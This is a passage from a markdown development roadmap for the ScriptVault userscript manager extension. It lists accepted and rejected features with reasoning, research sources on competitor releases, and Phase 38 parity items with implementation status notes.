| Emerging optimization techniques | Later | 30.6 | Priority Hints, Resource Hints, Scheduler.yield(), View Transitions; Chrome 135+ features |
| Discourse forum deployment | Now | 31.1 | 47k+ stars; moderation tools; Discord bot integration; peer support hub |
| Community reputation system | Now | 31.2 | Author badges (Trusted, Prolific, Helpful); install count tracking; peer voting |
| GitHub Discussions integration | Now | 31.3 | Native Q&A per repo; feature proposals linked to ROADMAP phases |
| Privacy-preserving usage insights | Now | 31.4 | Federated learning + differential privacy; Firefox Telemetry model; aggregate-only |
| Author Code of Conduct | Now | 31.5 | Security/licensing/update expectations; transparent removal/CVE logs; SLA commitments |
| Multi-manager interop liaison | Next | 31.6 | Compatibility matrix for TM/VM/ScriptCat/ScriptVault; migration guides; standards tracking |
| WASM Component Model support | Next | 32.1 | W3C standard; scripts compile to WASM components; opt-in for perf-critical use |
| Cross-platform portability standard (abx-spec) | Next | 32.2 | Enable scripts to run in browser/automation/model-backed tools unchanged; export format |
| JavaScript modularization (import.meta) | Later | 32.3 | TC39 Stage 4; module federation; @require-module via import maps |
| MV3 parity lock-in documentation | Now | 32.4 | Quarterly "Feature Parity Chart" across TM/VM/ScriptCat; archive MV2 docs |
| Model-assisted debugging (ethical bounds) | Next | 32.5 | "Explain error" + "show patterns" only (no code generation); local runner or hosted batch |
| Wasmtime feasibility study | Later | 32.6 | Research WASI Preview 2+; evaluate as alternative runtime for long-running tasks |

### Accepted — Now/Next (Phases 33–35)

| Item | Tier | Phase | Reasoning |
|------|------|-------|-----------|
| WXT cross-browser build pipeline | Now | 33.1 | Prerequisite to all Firefox/Edge/Safari work; auto-handles MV2/MV3 conversion |
| Firefox MV3 port | Now | 33.2 | Highest-value target after Chrome; AMO is largest non-CWS extension marketplace |
| Firefox for Android | Next | 33.3 | Only stable mobile browser supporting MV3 extensions; depends on 33.2 |
| Edge Add-ons store submission | Now | 33.4 | 1–3 days; build is already Chrome-compatible; expand reach |
| Brave/Vivaldi/Opera/Arc compat sweep | Now | 33.5 | Chromium-based; doc Brave Shields conflict, Vivaldi commands, Arc sidebar |
| Orion Browser validation | Next | 33.6 | Near-zero effort; Mac/iOS WebKit; load Firefox build, document |
| Safari Web Extension | Later | 33.7 | 8–16 weeks Swift work; defer behind decision gate (1k+ install demand) |
| Monaco screen reader compatibility | Now | 34.1 | Critical a11y gap in Phase 14; Alt+F1 help, plain-textarea fallback, ARIA labels |
| Voice control (Talon) audit | Next | 34.2 | Add `data-talon-action` hints; document Cursorless limitation |
| WAI-ARIA APG keyboard patterns | Now | 34.3 | Tablist/grid/combobox/dialog: arrow-key nav, focus traps, skip links |
| Forced-colors mode (Windows HC) | Now | 34.4 | `@media (forced-colors: active)`; system colors; Monaco hc-black theme switch |
| Reduced-motion CSS-first | Now | 34.5 | Replace JS detection with `@media (prefers-reduced-motion: reduce)` |
| Cognitive accessibility audit | Now | 34.6 | Flesch 60+ for all error messages; consistent vocabulary; plain verbs |
| scriptvault.dev/docs (Starlight) | Now | 34.7 | Quick start, GM API ref, recipes, migration guides; Algolia DocSearch |
| First-run empty state (no wizard) | Now | 34.8 | Anti-bloat compliant: empty-state copy + sample script + 3 buttons |
| YouTube tutorial channel | Next | 34.9 | 5 screencasts (install, first script, GM API, migrate, sync); captioned |
| ICU MessageFormat + RTL | Now | 34.10 | Replace `{0}` with ICU plurals; add ar/hi/ko/tr; Crowdin pipeline |
| axe-core + Pa11y in CI | Now | 34.11 | Vitest + Playwright + GH Actions; gate PRs on WCAG 2.2 AA |
| IPFS CID integrity + gateway fallback | Now | 35.1 | Zero new deps; HTTP fetch + WebCrypto; survives DMCA takedowns |
| Nostr discovery (NIP-C0) | Next | 35.2 | 30 KB nostr-tools; smallest federation protocol; uncensorable |
| did:key author signatures | Now | 35.3 | Zero new deps; native crypto.subtle; impersonation prevention |
| ActivityPub passive consumption | Next | 35.4 | Plain HTTP GET to Forgejo outboxes; push-style update notifications |
| Self-hosted registry spec | Next | 35.5 | Open spec + Go reference impl; enables corporate + community registries |
| Censorship-resistant update resolution | Next | 35.6 | IPFS → Nostr → Wayback fallback chain; signature-verified |

### Rejected — Phase 35 Federation (With Documented Reasoning)

| Item | Why Rejected |
|------|--------------|
| Matrix as sync transport | 500 KB SDK; users prefer dedicated sync (Phase 21); link as community-only |
| Solid Pods | 300 KB SDK; <0.1% userscript-author overlap with Solid community |
| DAT/Hypercore/Pear runtime | Requires separate Pear runtime install — hard userscript user no |
| WebRTC mesh sync (y-webrtc) | 605 KB Yjs accepted in 29.4; mesh adds NAT complexity for marginal benefit |
| WebTorrent | 600 KB; userscripts <100 KB — wrong scale for BitTorrent |
| Helia (in-browser IPFS node) | 200 KB+ DHT; gateway fallback (35.1) achieves 95% value at 0% weight |
| Full Verifiable Credentials | 300 KB JSON-LD; DIDs alone (35.3) sufficient for threat model |
| Radicle P2P git | Requires `rad` binary install — userscript users won't install |
| AT Protocol custom Lexicon | Maintenance burden; defer until Bluesky userscript community materializes |

### Rejected — With Reasoning (Continued)
| `@background` persistent scripts (ScriptCat) | Fundamentally incompatible with MV3 SW model. ScriptCat achieves this via a non-standard SW keepalive mechanism that violates CWS policies. Architecture would require a complete rewrite. Rejected as architectural mismatch. |
| Generated-script product pattern (Tweeks pattern) | Explicitly deleted from ScriptVault as bloat (see CLAUDE.md). The Tweeks HN launch validates market demand but contradicts the project's stated design philosophy. Rejected — not this project's mission. |
| Script subscription/feed system (ScriptCat) | Explicitly removed from ScriptVault as "over-engineered". Would duplicate GreasyFork's function. Rejected as feature creep. |
| `CAT_fileStorage` binary cloud storage | ScriptCat-unique architecture requiring a dedicated cloud backend. Maintenance burden too high; no clear user base for ScriptVault. Rejected as disproportionate effort. |
| `CAT_proxy` per-script proxy | Conflicts with Proxy SwitchyOmega and similar extensions. Requires elevated permissions. ScriptCat acknowledges conflict risk. Rejected as too invasive. |
| Multi-file ES module project IDE (ScriptFlow) | ScriptFlow is a standalone application for this exact use case. Implementing it in ScriptVault would duplicate ScriptFlow and require a bundler pipeline inside the extension. Rejected for this manager. |
| Live HTML/CSS/JS preview window (ScriptFlow) | Same rationale as multi-file IDE. Rejected. |
| Git repo integration (clone/commit in browser) | 13.7 covers script-file sync to git. Full clone/commit/push of arbitrary repos is a different product category. Rejected as scope creep beyond script management. |
| `GM_openInTab` `useOpen` / `incognito` | ScriptCat-specific; very niche use cases (special-protocol URLs, incognito automation). Low demand signal. Deferred: Under Consideration. |
| `GM_registerMenuCommand` `accessKey` keyboard shortcut | Specification explicitly prohibits keyboard shortcuts (CLAUDE.md universal rule). Rejected. |
| `GM_registerMenuCommand` `nested` context-menu level | ScriptCat-specific UI pattern; does not translate cleanly to Chrome extension popup model. Rejected as UX mismatch. |
| `GM_audio.getState()` | TM experimental with no published documentation. No use case beyond very niche audio-control scripts. Rejected as too experimental. |
| `GM_log` with levels | The extension already has an execution log panel. This would add an API surface for something the log panel already provides. Deferred: Under Consideration for Phase 7 log panel expansion. |
| Script-to-standalone-extension compiler | Distribution tooling for non-technical users. Not a script manager feature. Community tool (`hrussellzfac023.github.io`) already exists. Rejected. |
| Enterprise MDM/registry policy deployment | VM issue #2365 with 6 comments — low demand relative to effort. Requires Chrome policy infrastructure. Deferred: Under Consideration for a future enterprise-focused phase if demand grows. |
| Script subscription/collectible collections | Same as script subscription/feed above. Rejected. |
| Toolbar badge display options (TM) | Low-value cosmetic option. Deferred: Under Consideration as a minor preference in a settings cleanup pass. |
| `$DATETIME$` template variable | Trivial to add but not in any user-facing issue tracker. Under Consideration as part of a future "editor quality of life" micro-release. |
| Storage editor `Ctrl+S` save | TM changelog item. Dashboard already has storage viewer; Ctrl+S save is a minor UX improvement. Under Consideration alongside the storage editor work in Phase 7. |
| SPA-aware `@match-active` metadata (VM proposal) | Phase 11.10 covers the behavioral fix (`@run-at navigation`). The `@match-active` metadata proposal is speculative. Deferred: evaluate after `@run-at navigation` ships. |
| Firefox port (all phases) | Tracked separately in `FIREFOX-PORT.md`. Excluded from this roadmap to prevent scope bleed. |
| Mobile support | Desktop-only Chrome extension. No mobile Chrome extension runtime for injecting userscripts. Rejected as platform limitation. |
| CHIPS cookie partition in XHR | Nobody has implemented this yet; Chrome's cookie partitioning API is still evolving. Under Consideration once the Chrome API stabilizes. |
| `@require-local` / local script as dependency | This is Phase 11 item 11.7's `@require` work extended. The `@require-local` pattern (referencing another installed script by ID as a dependency) is a valid extension of the `@require` SRI work. Under Consideration as Phase 11 follow-up. |
| Hosted assistant / MCP integration (ScriptCat v1.4.0-beta) | ScriptCat v1.4.0-beta ships an assistant surface with MCP integration for generating and debugging scripts. Explicitly contradict's ScriptVault's anti-bloat philosophy (see CLAUDE.md deleted features). Rejected — not this project's mission. |
| GM_webRequest (MV3) | Permanently dropped from Chrome MV3; TM v5.2+ removed it. `chrome.declarativeNetRequest` does not support per-request callbacks. Structural blocker. Rejected as MV3 architectural impossibility. |
| Full OPFS migration (replace IDB entirely) | OPFS is ideal for large binary file storage but cannot serve as the metadata/index layer efficiently. IDB must remain as the metadata and query layer. Rejected for IDB replacement; OPFS used only as overflow for large script bodies (Phase 18.2). |
| ClickRemix / generated userscript workflow | HN 2025 product hunt; a model writes userscripts from natural-language prompts. Validates market demand but directly contradicts ScriptVault's stated philosophy. Rejected per philosophy. |
| GM_wsConnectTo (TM #1483) | WebSocket proxy bypass via extension background; very niche use (scripts blocked from WebSocket by CSP). No active demand in ScriptVault tracker. Under Consideration for later phase if demand emerges. |
| Anonymous XHR credential stripping | TM documents `anonymous: true` to strip cookies/credentials from GM_xmlhttpRequest. Low demand signal beyond existing `anonymous` mode in VM. Under Consideration as trivial addition to Phase 16. |

---

## External Research (Round 10) — 2026 H1 Platform & Competitor Sweep

**Date:** 2026-04 sweep covering Chrome 138-148, Violentmonkey v2.34.1-2.37.1, ScriptCat v0.16.13-0.16.14, and CWS publisher-side changes that landed since Round 9. Net-new signal concentrates in three areas: structured-clone messaging, on-device local models, and incremental author-DX directives that competitors shipped in the gap.

### Sources Cited (Round 10)

| # | URL | Surfaced Item(s) |
|---|-----|------------------|
| R10.1 | https://developer.chrome.com/blog/structured-clone-messaging | Phase 36.1 (`message_serialization`), Phase 37.4 (interop matrix) |
| R10.2 | https://developer.chrome.com/docs/extensions/whats-new | Chrome 132 `tabs.frozen` (37.6), Chrome 138 NTP changes, Chrome 140 `sidePanel.getLayout` (36.3), Chrome 148 release context |
| R10.3 | https://developer.chrome.com/docs/extensions/ai/prompt-api | Phase 36.2 (Prompt API in extensions, Origin Trial chain Chrome 138 → 148) |
| R10.4 | https://chromestatus.com/feature/6325545693478912 | Phase 36.2 sampling-parameter origin trial |
| R10.5 | https://developer.chrome.com/blog/cws-new-enterprise-publishing-option | Phase 37.1 (enterprise external-org publishing, Feb 20 2026) |
| R10.6 | https://developer.chrome.com/blog/cws-role-expansion-developer-dashboard | Phase 37.2 (publisher roles, April 30 2026) |
| R10.7 | https://developer.chrome.com/blog/cws-new-appeals-process | Phase 37.3 (in-dashboard appeals, April 8 2026) |
| R10.8 | https://developer.chrome.com/docs/extensions/develop/concepts/extensions-update-lifecycle | Phase 37.5 (update lifecycle docs, Sept 9 2025) |
| R10.9 | https://github.com/violentmonkey/violentmonkey/releases/tag/v2.37.0 | `@tag` polish, dashboard sort restore, GM_addElement parent fix |
| R10.10 | https://github.com/violentmonkey/violentmonkey/releases/tag/v2.36.0 | Phase 36.8 (per-frame popup menu commands) |
| R10.11 | https://github.com/violentmonkey/violentmonkey/releases/tag/v2.35.2 | Phase 36.4 (`@tag` directive), Phase 36.9 (per-script notes) |
| R10.12 | https://github.com/violentmonkey/violentmonkey/releases/tag/v2.35.0 | Phase 36.10 (live local `@require`), Phase 36.13 (vacuum on trash empty) |
| R10.13 | https://github.com/violentmonkey/violentmonkey/releases/tag/v2.34.1 | Phase 36.11 (`{{icon}}` template token) |
| R10.14 | https://violentmonkey.github.io/posts/how-to-edit-scripts-with-your-favorite-editor/ | Phase 36.10 design context |
| R10.15 | https://github.com/violentmonkey/violentmonkey/issues/2419 | Phase 36.5 (`@require-id` local module resolution) |
| R10.16 | https://github.com/violentmonkey/violentmonkey/issues/2403 | Phase 36.6 (comma-separated `@match`), Phase 36.14 (popup +Domain button) |
| R10.17 | https://github.com/violentmonkey/violentmonkey/issues/2342 | Phase 36.7 (default top-level await) |
| R10.18 | https://github.com/scriptscat/scriptcat/releases/tag/v0.16.14 | Phase 36.12 (`once(...)` schedule), iframe nested postMessage fix, removed axios dep |
| R10.19 | https://github.com/scriptscat/scriptcat/releases/tag/v0.16.13 | CustomEvent secret-leak CVE — review for our MAIN↔ISOLATED bridge (Phase 5 update) |
| R10.20 | https://github.com/Tampermonkey/tampermonkey/issues?q=is%3Aissue+sort%3Aupdated-desc | TM milestone 5.5 enhancement queue (#2734, #2748, #2731 — content not yet substantive enough to extract specific phase items, will revisit Round 11) |
| R10.21 | https://github.com/webmachinelearning/prompt-api | Prompt API spec source for Phase 36.2 |
| R10.22 | https://developer.chrome.com/docs/extensions/reference/api/sidePanel#method-getLayout | Phase 36.3 API reference |

### Round 10 — Items Folded Into Existing Phases (no new sub-phase)

- **VM v2.37.0 dashboard sort restore** — already covered by Phase 7 dashboard polish; existing list-state persistence handles it.
- **VM v2.37.0 GM_addElement parent fix** — already covered by Phase 11 GM_addElement (Phase 11.x); add a regression test for the parent-resolution edge case (`(parent: ParentNode | null, tagName, attrs)` — null parent should default to `document.head ?? document.documentElement`).
- **ScriptCat v0.16.14 iframe nested postMessage fix** — defensive depth-check belongs in our existing Phase 5 sandbox bridge tests; no new feature.
- **ScriptCat v0.16.13 CustomEvent secret leak** — security review entry: our MAIN↔ISOLATED bridge passes payloads via `CustomEvent.detail`. Audit: confirm we never include the GM secret/nonce in `detail` payloads readable by the page. Tracked as a Phase 5 follow-up; no new sub-phase.
- **Chrome 138 NTP footer changes** — irrelevant to ScriptVault (we don't override NTP).
- **Chrome 132 storage editor in DevTools** — already a developer affordance; no integration work needed.
- **CWS Publisher Roles role-name details** — folded into Phase 37.2 already.

### Round 10 — Items Rejected (with reasoning)

| Item | Why Rejected |
|------|--------------|
| Bundle local model fallback to hosted model API | Network-dependent model calls directly contradict ScriptVault's local-first philosophy and would require API-key UX. Phase 36.2 stays Prompt-API-only or off. |
| `SharedArrayBuffer` in messages | Not supported under structured-clone messaging; no use case in ScriptVault today. |
| Mass extension-conversion tooling that turns scripts into standalone CRX (CWS role context) | Distribution tooling, not a manager feature. Already rejected in Round 8/9 list. |

### Round 10 — Items Promoted to Now/Next

The following Round-10 sub-phases are tagged **Next** by impact (most are high-leverage parity catch-up or platform-API alignment with low-to-medium effort):

- **Now:** 36.1 structured-clone messaging (manifest one-liner + 30-min audit), 37.4 interop matrix (must precede 36.1 cutover), 36.4 `@tag` directive, 36.11 `{{icon}}` token, 36.6 comma `@match` desugar.
- **Next:** 36.3 RTL side-panel, 36.8 per-frame popup menus, 36.9 per-script notes, 36.13 storage vacuum, 36.14 popup +Domain button, 37.5 update-lifecycle doc cross-reference, 37.6 `tab.frozen` gating.
- **Later:** 36.2 Prompt API integration (high effort, hardware-gated, opt-in only), 36.5 `@require-id` (compatibility risk), 36.7 default TLA (breaking change for legacy scripts; needs migration period), 36.10 live local-`@require` reload (security review needed for localhost auto-fetch).
- **Under Consideration:** 36.12 `once(...)` cron (slot into Phase 13 scheduler if/when phase ships), 37.1/37.2/37.3 (process docs — actioned only when ScriptVault hits CWS publication or enterprise demand emerges).

### Round 10 Completion Note

Floor of 30-60 sources is exceeded across all 10 rounds combined (well over 200 cumulative URLs in the appendix). Round 10's net-new contribution is ≈22 distinct sources concentrated on 2026 H1 platform shifts and the gap between Round 9's VM/SC baseline (v2.34/v0.16.13) and current upstream (VM v2.37.1, SC v0.16.14). No Round-10 item duplicates a shipped phase or a Now/Next item from earlier rounds. Two new phases (36, 37) added; phase summary table updated below.

---


---

## Phase 38 — Round 11 Catch-up (May 2026)

**Goal:** Track upstream releases and Chrome platform deltas published since the Round 10 cutoff (April 22, 2026). Sources: VM v2.37.0 (Apr 23 2026) + v2.37.1 beta, ScriptCat v1.4 (hosted assistant system), Tampermonkey 5.5.6234–5.5.6237 (Jan–Apr 2026), no Chrome 149/150 extension-API surface changes worth a phase.

### 38.1 `GM_addElement` null-on-failure contract (VM v2.37.0 + TM 5.5.6237 parity) ✅ Shipped (2026-05-19)

Both VM v2.37.0 ([#2500](https://github.com/violentmonkey/violentmonkey/issues/2500)) and TM 5.5.6237 (April 10, 2026) converged on the same fix this month: `GM_addElement(parent, tag, attrs)` now returns `null` instead of throwing or returning `undefined` when the parent argument is falsy or the element fails to attach. Two independent maintainers landing the same contract in the same month makes it the de-facto spec.

- Audit ScriptVault's `GM_addElement` wrapper in `bg/` and the content-side mirror — any path that currently throws on falsy parent or detached node should `return null` and log via `errorLog.push` instead.
- Add a regression test pinning the contract: `GM_addElement(null, 'div')` → `null`; `GM_addElement(detachedNode, 'div')` → `null`; valid call → returns the created element.
- Source: [VM #2500](https://github.com/violentmonkey/violentmonkey/issues/2500), [TM changelog 5.5.6237](https://www.tampermonkey.net/changelog.php).

**Status (2026-05-19):** ✅ Shipped. Both `background.core.js` `GM_addElement()` and the TS mirror at [`src/background/wrapper-builder.ts`](src/background/wrapper-builder.ts) now return `null` on every failure path: non-string/empty `tag`, `document.createElement(tag)` throws, falsy parent, parent without `appendChild`, or `appendChild()` throws. Attribute-application errors no longer abort the call (they're caught so the element can still be attached). Regression suite [`tests/wrapper-dom-security.test.js`](tests/wrapper-dom-security.test.js) added 3 cases pinning the null-on-failure contract for null parent, detached parent, empty tag, numeric tag, malformed tag, plus the happy path.

### 38.2 Regex search in dashboard script search (TM 5.5.6234 parity) ✅ Shipped (2026-05-19)

TM 5.5.6234 (January 15, 2026) added regex support to its in-dashboard script search bar. ScriptVault already has `code:` prefix for full-text source search (Phase 7) — extend the same input with `re:` (or `/pattern/flags`) to apply a `RegExp` against the searched corpus.

- Parser: detect a leading `/` + trailing `/flags` or a `re:` prefix and compile to `new RegExp(...)` inside a `try { } catch (e) { showInvalidRegexHint() }`.
- Apply against script `name`, `description`, `match` patterns, and (when combined with `code:`) the source body.
- Highlight hits in the result rows; debounce the regex compile to one per 200ms to avoid pathological-pattern lockups.
- Source: [TM changelog 5.5.6234](https://www.tampermonkey.net/changelog.php).

**Status (2026-05-19):** ✅ Shipped. [`pages/dashboard.js`](pages/dashboard.js) adds `parseDashboardSearchRegex()` recognizing both `re:<pattern>` (case-insensitive default to match substring ergonomics) and `/pattern/flags` (flags honored verbatim) shapes. `getFilteredScripts()` compiles the pattern in a try/catch — invalid regex surfaces via `aria-invalid="true"` + descriptive `title` tooltip on the search input and yields an empty result set so the typo is visible instead of masked. `code:` prefix composes with regex (`code:re:fetch\(`). Existing 90ms debounce in `queueScriptTableRender()` is well under the 200ms recommendation. Regression suite [`tests/dashboard-search-regex.test.js`](tests/dashboard-search-regex.test.js) adds 8 cases pinning the parser shape, flag handling, case-sensitivity defaults, and the malformed-regex throws-at-construction contract that the caller relies on.

### 38.3 Decouple update-check from auto-install — TM ships first (Phase 17.3 fast-track)

TM 5.5.6235 (February 13, 2026) shipped the long-requested split between "check for updates" and "install update" ([VM #1023](https://github.com/violentmonkey/violentmonkey/issues/1023)). Phase 17.3 already plans this for ScriptVault — TM doing it first means the most-painful documented behavior in the userscript-manager community is now solvable by switching managers, which raises the urgency.

- Promote 17.3 from **Now** to **Now-priority-1** within the security-round-2 phase ordering.
- Specific UI: Settings → Updates → "Check only" / "Check + install" / "Manual review per script" tri-state, defaulting to "Check + install" for backwards compatibility but exposing the toggle prominently.
- Add an inline "1 update available" badge on every script row when in "Manual review per script" mode, click to diff (existing Phase 15.4) → confirm → apply.
- Source: [TM changelog 5.5.6235](https://www.tampermonkey.net/changelog.php), [VM #1023](https://github.com/violentmonkey/violentmonkey/issues/1023).

### 38.4 `@run-at context-menu` runnable from popup (TM 5.5.6234 parity) ✅ Shipped (2026-05-19)

TM 5.5.6234 added a "Run on this page" entry in the popup that fires `@run-at context-menu` scripts without the user having to right-click. ScriptVault already has Phase 11.4 "Run on This Tab" (shipped v3.4.0) for arbitrary scripts — extend that path to enumerate the active tab's `@run-at context-menu` scripts and surface them as a dedicated popup section.

- Reuse the existing `runScriptNow` background message handler (v3.4.0 shipped) — only the popup UI changes.
- Section header: "Context-menu scripts" with a count badge; each row a single-tap launcher.
- Hide the section entirely when no `context-menu` scripts match the current tab.
- Source: [TM changelog 5.5.6234](https://www.tampermonkey.net/changelog.php).

**Status (2026-05-19):** ✅ Shipped. [`pages/popup.html`](pages/popup.html) declares a new `#contextMenuSection` block (header, count badge with 6px corner radius per project no-stadium-shape rule, list) above the main `#scriptList`. [`pages/popup.js`](pages/popup.js) `renderContextMenuScripts()` filters the existing `pageScripts` for `meta['run-at'] === 'context-menu'` enabled scripts, hides the section entirely when empty, and renders each as a single-tap launcher that calls the existing `runScriptNow` background handler (v3.4.0 shipped). No new background plumbing; no new permissions.

### 38.5 Open local userscript file + watch disk for changes (TM 5.5.6236 parity, Chrome path)

TM 5.5.6236 (April 2, 2026) shipped open-from-disk + watch-for-changes for Chrome — the user picks a `.user.js` from disk in the popup, edits in their external editor, and TM hot-reloads on save without a manifest URL. This is the user-facing companion to Phase 36.10 (live `@require` re-fetch on SW wake).

- Use [`window.showOpenFilePicker()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/showOpenFilePicker) (Chrome 86+) to acquire a `FileSystemFileHandle`.
- Persist the handle in IndexedDB (handles survive across SW restarts; permission must be re-prompted on next dashboard open via [`queryPermission()`](https://developer.mozilla.org/en-US/docs/Web/API/FileSystemHandle/queryPermission)).
- Poll `getFile().lastModified` every 2 seconds while dashboard is focused (Page Visibility API gate); on change, re-parse and re-register through the existing `installFromCode` path (v3.8.0 shipped).
- Settings toggle: "Watch local files for changes" (default off — explicit opt-in per script).
- This belongs alongside Phase 36.10 in execution order (both share the live-reload infrastructure).
- Source: [TM changelog 5.5.6236](https://www.tampermonkey.net/changelog.php), [File System Access API](https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API).

### 38.6 Native `window.onurlchange` via Navigation API (ScriptCat v1.4 parity) ✅ Shipped (2026-05-19)

ScriptCat v1.4 reimplemented `window.onurlchange` on the [Navigation API](https://developer.mozilla.org/en-US/docs/Web/API/Navigation_API) (Chrome 102+) instead of polling `location.href`. Cleaner SPA support, lower CPU, fires on `popstate`, `pushState`, `replaceState`, and bfcache restore in a single event. ScriptVault's current `window.onurlchange` grant uses a `MutationObserver` + `setInterval` polling combo (see `bg/` content-side bridge) which can miss SPA transitions on sites that swap routes without DOM mutation.

- Replace the polling shim with `navigation.addEventListener('navigate', ...)` when `window.navigation` exists; keep the polling fallback for non-supporting platforms (Safari, older Firefox).
- The existing event payload (`{ url, oldUrl }`) stays; just fires more reliably.
- Tie into Phase 11.10 `@run-at navigation` if/when that ships — same plumbing.
- Source: [ScriptCat v1.4 changelog](https://docs.scriptcat.org/en/docs/change/v1.4/), [Navigation API](https://developer.chrome.com/docs/web-platform/navigation-api).

**Status (2026-05-19):** ✅ Shipped. Added a Navigation API hook (`window.navigation.addEventListener('navigate', ...)`) inside the page-scoped one-time setup in both `background.core.js` and the TS mirror at [`src/background/wrapper-builder.ts`](src/background/wrapper-builder.ts). Dispatches `__checkUrlChange` on the next microtask so `location.href` reflects the new URL by the time the per-script handlers run. The pushState/replaceState/popstate/hashchange shim is preserved as a backstop for the Firefox port and for SPA libraries that bypass the Navigation API. minimum_chrome_version 130 (Phase 40.23) guarantees the API is always present in supported Chromium builds, so the Chrome path now uses native event dispatch rather than poll-on-history-mutate.

### 38.7 Hebrew translation + RTL smoke test (TM 5.5.6235 parity)

TM 5.5.6235 added Hebrew (`he`) — the first RTL language across major userscript managers. ScriptVault has 8 LTR languages today; Hebrew is the lowest-effort way to validate Phase 14.6 (RTL groundwork) and Phase 36.3 (`sidePanel.getLayout()` RTL flip) end-to-end before committing to Arabic/Persian.

- Add `_locales/he/messages.json` with translations for the same key set as `en`.
- Set `dir="rtl"` on `<html>` when `chrome.i18n.getUILanguage()` returns an RTL locale; flip animations, drawer slide direction, and the side panel preview pane.
- Acceptance: dashboard, popup, side panel, install page, and devtools panel all render correctly with Hebrew strings; Monaco does its own RTL handling natively.
- Pulls Phase 14.6 (RTL groundwork) from **Next** to **Now-deferred-on-translation** — string changes are zero-risk and can ship before translation lands.
- Source: [TM changelog 5.5.6235](https://www.tampermonkey.net/changelog.php).

### 38.8 Tab rename to "Settings | Update | Sync" (VM v2.37.1 beta UX) ✅ Shipped (2026-05-19)

VM v2.37.1 split its monolithic Settings tab into three: Settings, Update, Sync. Reduces scroll length and surfaces the update-check controls (newly decoupled per 38.3) closer to where users look for them.

- ScriptVault's dashboard sidebar already has these as separate sections — no UI work, but worth confirming the labels match VM's convention (Settings / Update / Sync) for cross-manager intuition.
- Confirm: "Updates" section already exists; rename to singular "Update" to match VM/TM convention; "Sync" section already exists.
- Cosmetic-only; ship inside the next dashboard polish point release.
- Source: [VM v2.37.1 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.37.1).

**Status (2026-05-19):** ✅ Shipped. Per-script settings panel in [`pages/dashboard.html`](pages/dashboard.html) renamed `Updates` → `Update` (singular) to match VM v2.37.1 / TM split convention. The top-level dashboard sidebar already used Settings / Utilities / Trash / Script Store; there is no separate top-level "Update" or "Sync" tab because those live as sections inside Settings (matches the VM v2.37.1 layout). Cosmetic-only change, zero risk.

### 38.9 "Don't force update on normal click" guard (VM v2.37.1 beta UX) ✅ Shipped (2026-05-19)

VM v2.37.1 fixed a footgun where clicking the per-script "check for updates" icon would also auto-install the update without a confirmation step. ScriptVault's dashboard force-update button (Phase 7) currently does the same — single click triggers fetch + install with no diff preview.

- Audit: change the dashboard force-update icon's `onclick` to invoke check-only; if an update is available, show a banner with [Diff] / [Install] / [Dismiss] actions instead of installing immediately.
- Side effect: aligns with Phase 38.3 (decoupled update flow) — same "Manual review per script" mode behavior.
- Tests: `dashboard-update.test.js` should pin the new flow — single click ≠ install.
- Source: [VM v2.37.1 release notes](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.37.1).

**Status (2026-05-19):** ✅ Shipped. [`pages/dashboard.js`](pages/dashboard.js) new `interactiveCheckAndConfirmUpdate()` is wired to the per-row update icon's `click` handler. The function calls `checkUpdates` only — if an update is available it surfaces a three-button modal (`View diff` / `Install update` / `Cancel`) via the existing `showModal()` helper. "View diff" opens the existing `showDiffView` with old/new code and ping-pongs back to the confirmation. Right-click still triggers `checkScriptForUpdates(id, { force: true })` (cache-bypass force update). Bulk update + popup "update" entries keep calling the auto-install path because they have their own progress-modal confirmation surface.

### 38.10 ScriptCat-style Assistant API (Under Consideration)

ScriptCat v1.4 shipped a full **assistant system** under `CAT.agent.*` — multi-turn conversation, 11 built-in tools (web scraping, tab management, OPFS filesystem, code execution, dialogs), [MCP protocol](https://modelcontextprotocol.io/) integration, sub-agents, scheduled tasks, skill bundles. This is the largest 2026 leap by any userscript manager.

- **Aligned with ScriptVault philosophy?** Mostly no. ScriptVault's stated principle is local-first, zero-telemetry. ScriptCat's assistant assumes a hosted model endpoint by default, though it can in theory run against an on-device model path (Phase 36.2).
- **What's salvageable:** the **MCP client** path (talk to a user-configured local MCP server) is fully local-first. Userscripts could grant `@grant CAT.agent.mcp` and call tool servers running on `localhost:<port>` without network. This is a Phase 36.2 extension worth scoping.
- **What's rejected:** the hosted-model defaults, the multi-turn chat UI, the sub-agent generator, and the skill marketplace — all require network and a UX surface that contradicts the focused-manager pitch.
- Mark **Under Consideration** pending Phase 36.2 (Prompt API) shipping and a clear user request signal. Do not start implementation speculatively.
- Source: [ScriptCat v1.4 changelog](https://docs.scriptcat.org/en/docs/change/v1.4/), [Model Context Protocol spec](https://modelcontextprotocol.io/specification).

### 38.11 GM_xmlhttpRequest service-worker event leak fix (TM 5.5.6237) ✅ Audited + regression suite (2026-05-19)

TM 5.5.6237 documents a Chrome-specific bug where repeated `GM_xmlhttpRequest` calls fill the browser's `filtered_service_worker_events` debug log with empty entries. Likely root cause: SW event listeners aren't being released between XHR completions.

- Audit ScriptVault's XHR proxy in `modules/xhr.js` and the post-Phase-1 TS mirror — ensure `port.onMessage` / `port.onDisconnect` listeners are removed on `xhr.onloadend`, not just `onload`.
- Add a memory-pressure smoke test: 1000 sequential `GM_xmlhttpRequest` calls, assert SW heap stays bounded (within 10MB of baseline post-GC).
- Source: [TM changelog 5.5.6237](https://www.tampermonkey.net/changelog.php).

**Status (2026-05-19):** ✅ Audited — TM's bug class does not translate to ScriptVault. The XHR dispatch path uses `AbortController` + one-shot `chrome.tabs.sendMessage` (no persistent `port.onMessage` / `port.onDisconnect` subscribers per request). The `setTimeout` timeout handle is cleared in a `try/finally` on the inner IIFE. `XhrManager.create()` stages a fallback 5-minute auto-cleanup timer that is also cleared on `remove()`. Added [`tests/xhr.test.js`](tests/xhr.test.js) `Phase 38.11` describe block with 3 cases pinning the no-leak invariant: 1000 sequential create→remove cycles leave the table empty after the auto-cleanup window elapses, `abortByScript()` removes the matching requests without zombies, `abortByTab()` removes the matching requests without zombies.

### 38.12 Pluralize `GM_info.script.tags` (VM v2.37.0) ✅ Shipped (2026-05-19)

VM v2.37.0 renamed `GM_info.script.tag` (singular) to `tags` (plural array). ScriptVault's parser already exposes `meta.tags: string[]` (shipped v3.9.0, Phase 36.4) — verify `GM_info.script.tags` is the consumer-facing field, alias `script.tag` to `script.tags[0]` for back-compat with scripts written against pre-2026 VM.

- Compatibility shim: `Object.defineProperty(GM_info.script, 'tag', { get() { return this.tags?.[0]; } })`.
